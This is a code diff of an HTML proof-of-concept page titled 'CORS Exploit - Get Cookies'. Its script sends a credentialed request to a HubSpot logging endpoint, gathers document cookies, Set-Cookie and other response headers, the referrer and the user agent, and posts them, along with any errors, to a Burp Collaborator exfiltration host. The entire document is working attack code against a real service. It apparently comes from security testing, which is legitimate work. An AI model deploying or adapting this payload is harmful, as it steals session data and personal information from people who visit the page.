@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit - Send Cookies to Collaborator</title>
+    <title>CORS Exploit - Get Cookies</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
     (function() {
-        // Send request with credentials
+        // 1. First, send request to HubSpot with credentials
         fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
             method: 'POST',
-            credentials: 'include',  // This sends the cookies!
-            headers: {'Content-Type': 'application/json'},
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
+            },
             body: JSON.stringify([{
                 event: 'page_view',
                 properties: {
@@ -21,29 +24,46 @@
             }])
         })
         .then(response => {
+            // Get Set-Cookie headers from response
+            var setCookieHeaders = response.headers.get('Set-Cookie') || 'No Set-Cookie header';
+            
+            // Get all response headers
+            var allHeaders = {};
+            response.headers.forEach((value, key) => {
+                allHeaders[key] = value;
+            });
+            
             return response.text().then(data => {
-                return {status: response.status, data: data};
+                return {
+                    status: response.status,
+                    statusText: response.statusText,
+                    data: data,
+                    setCookie: setCookieHeaders,
+                    allHeaders: allHeaders,
+                    url: response.url
+                };
             });
         })
         .then(result => {
-            // Get cookies
-            var cookies = document.cookie || "No cookies found (HttpOnly)";
+            // Try to get cookies from document (if any non-HttpOnly exist)
+            var docCookies = document.cookie || "No document.cookie (all HttpOnly)";
             
-            // Encode in base64
-            var encodedCookies = btoa(unescape(encodeURIComponent(cookies)));
-            var encodedResponse = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
-            
-            // Send to Collaborator
+            // Get all cookies from document.cookie and also try to extract from response
             var payload = {
-                cookies: encodedCookies,
-                cookies_raw: cookies,
-                response: encodedResponse,
-                response_raw: result,
+                doc_cookies: docCookies,
+                set_cookie_header: result.setCookie,
+                all_response_headers: result.allHeaders,
+                response_status: result.status,
+                response_data: result.data.substring(0, 500), // First 500 chars
+                response_url: result.url,
                 origin: window.location.origin,
                 userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
+                referrer: document.referrer || 'No referrer',
+                timestamp: new Date().toISOString(),
+                note: "HttpOnly cookies cannot be read by JavaScript. They are only sent automatically in requests."
             };
             
+            // Send to Collaborator
             return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                 method: 'POST',
                 mode: 'no-cors',
@@ -56,14 +76,15 @@
         })
         .catch(error => {
             console.log('[-] Error:', error);
-            // Send error to Collaborator
             fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     error: error.toString(),
-                    origin: window.location.origin
+                    errorStack: error.stack,
+                    origin: window.location.origin,
+                    timestamp: new Date().toISOString()
                 })
             });
         });
